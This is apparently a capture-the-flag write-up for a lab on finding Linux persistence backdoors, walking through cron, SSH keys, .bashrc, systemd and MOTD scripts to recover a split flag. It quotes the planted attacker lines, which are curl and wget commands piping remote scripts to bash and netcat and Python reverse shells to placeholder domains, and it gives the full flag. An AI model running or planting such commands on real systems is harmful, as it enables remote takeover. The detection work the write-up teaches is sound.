# Hide and Seek

## Challenge Description
> ![image](https://github.com/user-attachments/assets/0f687eeb-0bb2-45a1-8fd5-6e15fc884a14)

## Solution
Each clue pointed to a different persistence mechanism. By systematically investigating each potential entry point, we uncovered hidden backdoors and extracted fragments of the final flag.

### 1. Time is on my side, always running like clockwork.
#### Investigating Cron Jobs (Scheduled Tasks)
A likely persistence method involving timing is cron jobs. To list all scheduled tasks, we ran:
```bash
sudo -su
crontab -l
```

![image](https://github.com/user-attachments/assets/18502c2c-748a-44bb-bf57-993ed9cfe334)

We found an encoded command in the cron job. Using [Cyberchef](https://gchq.github.io/CyberChef/), we decoded the Base64 string, revealing a command executing a malicious script: 
```bash
curl -s 54484d7b7930.storag3_c1ph3rsqu4d.net/a.sh | bash
```

![image](https://github.com/user-attachments/assets/176716dc-28b0-4770-b0ad-84b87f18ee18)

The hexadecimal portion (54484d7b7930) decoded to the first part of the flag:
```
THM{y0
```

![image](https://github.com/user-attachments/assets/904f6ccd-bfbb-48cb-8cc8-3dcfc17ed620)

### 2. A secret handshake gets me in every time.
#### Investigating SSH Backdoors
The term "handshake" hinted at SSH authentication. Checking for unauthorized SSH keys in users' home directories and We found a hidden SSH key in the zeroday user’s home directory. 

![image](https://github.com/user-attachments/assets/1bd44b26-9df8-4e5e-a2ec-9b913fa4d197)

Priniting the content for unauthorized SSH key:
```
cat ~/.ssh/.authorized_keys
```
![image](https://github.com/user-attachments/assets/8497645e-5163-4185-b1b7-c9b333fe6ed2)

Same as previously, we can insert the hexadecimal into **CyberChef** and reveals the second part of the flag.
```
2nd part: u_g0t_
```
![image](https://github.com/user-attachments/assets/64db205e-500c-4601-9b2f-53441616f614)

### 3. Whenever you set the stage, I make my entrance.
#### Investigating Bash Profile and RC Files
Startup scripts like `.bashrc` can execute malicious commands when a user logs in. We searched these files for suspicious entries from user to user:
```
cat .bashrc
```

A netcat reverse shell command was found in the specter user’s `.bashrc`:
```
nc -e /bin/bash 4d334a6b58334130636e513649444e324d334a3564416f3d.cipher.io 443 2>/dev/null
```

![image](https://github.com/user-attachments/assets/f06b8b8d-e447-4df2-832f-63cb062afc83)

Like previously, decoding the hexadecimal via **Cyberchef** gave us the third part of the flag:
```
3rd_p4rt: 3v3ryt
```

![image](https://github.com/user-attachments/assets/9a727c6e-1cce-4d87-a2f4-b793c69d7dc7)

![image](https://github.com/user-attachments/assets/c0b93841-f42d-4319-bde0-8c81eb7fb04b)

### 4. I run with the big dogs, booting up alongside the system.
#### Investigate Systemd Services & Init Scripts

To check for persistence via system services, we listed all enabled services:
```bash
systemctl list-unit-files --type=service | grep enabled
```

We found a suspicious service named `cipher.service`. 

![image](https://github.com/user-attachments/assets/8384fa10-57aa-4893-a1ab-f1387ab6f30c)

Checking its details:
```
systemctl status cipher.service
```

![image](https://github.com/user-attachments/assets/d8fcd52c-4e3f-437f-aa49-5851f9877ff8)

From the output, we know that the service full path is `/usr/lib/systemd/system/cipher.service`

With this piece of information, we can print the content of the file to read what’s inside.
```bash
cat /usr/lib/systemd/system/cipher.service
```

![image](https://github.com/user-attachments/assets/eca3bbb9-bf25-47ce-8db7-9389dd33df15)

From the output, we know that the service ran a script from `/usr/lib/systemd/system/cipher.service`:
```
ExecStart=/bin/bash -c 'wget NHRoIHBhcnQgLSBoMW5nXyAK.s1mpl3bd.com --output - | bash 2>/dev/null'
```

Like the previous flags, we decode the base64 via **CyberChef** to find the fourth part of the flag.
```
4th part - h1ng_ 
```

![image](https://github.com/user-attachments/assets/c90e7df3-634b-4945-8ba6-b5aad93e4619)

###  I love welcome messages.
#### Investigate /etc/motd, /etc/issue, and PAM Modules
The final clue pointed toward login messages. I found this helpful [article](https://security.stackexchange.com/questions/234859/inject-update-motd-d-00-header-to-run-a-script-on-ssh-login). 
The article talked about updating the MOTD header and inject `update-motd.d 00-header` to run a script on ssh login.

Let’s read this file on our system and see if our attacker used the same method.
```bash
cat etc/update-motd.d/00-header
```

![image](https://github.com/user-attachments/assets/4b6c7d48-06ee-415e-974e-598725a5373f)

Let’s read this file on our system and see if our attacker used the same method.
```bash
cat etc/update-motd.d/00-header
```

![image](https://github.com/user-attachments/assets/4b6c7d48-06ee-415e-974e-598725a5373f)

From the output, the `/etc/update-motd.d/00-header` file was modified to contain:
```
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("4c61737420706172743a206430776e7d0.h1dd3nd00r.n3t",)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);' 2>/dev/null
```
![image](https://github.com/user-attachments/assets/04eab28d-3eb4-4c3b-9ee9-4cc234655a93)

Like the previous flags, we decode the hexadecimal via **CyberChef** to find the last part of the flag.

![image](https://github.com/user-attachments/assets/5472fa61-bd0b-4098-8eaa-671c009bc574)

Updon decoding, revelas the last part of the flag
```
Last part: d0wn}
```

We can piece together the full flag.
```
THM{y0u_g0t_3v3ryth1ng_d0wn}
```

## Conclusion
This challenge demonstrated various persistence techniques commonly used by attackers. 
By systematically investigating scheduled tasks, SSH keys, login scripts, systemd services, and MOTD files, we were able to uncover all the backdoors Cipher had left behind.

## Flag
THM{y0u_g0t_3v3ryth1ng_d0wn}
